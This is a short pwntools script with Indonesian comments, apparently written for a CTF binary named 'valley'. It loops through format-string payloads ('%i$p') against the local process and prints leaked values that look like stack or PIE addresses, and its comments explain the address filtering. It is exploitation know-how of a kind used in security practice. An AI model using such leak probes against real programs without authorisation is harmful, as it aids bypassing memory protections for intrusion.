from pwn import *

context.log_level = "error"

for i in range(32): # kenapa pake 32 ?  idk ini lebih ke kebiasaan aja, lagipula biar keren aja 32, kalo kurang naikin ke 64 . jadi kek byte byte gitu wkwkkwkwkw
    pay = f"%{i}$p"

    p = process("./valley")
    p.sendlineafter(b":",pay.encode())
    p.recvuntil(b"distance: ")

    leak = p.recvline().decode()
    
    if leak.startswith(("0x5","0x6","0x7")):
        print(f"index {i} : {leak.strip()}")
        # filter ini dibuat karena stack biasanya berlokasi di alamat memori tinggi : 0x7f...
        # dan me leak PIE dari program : 0x5...-->0x6...

    p.close()




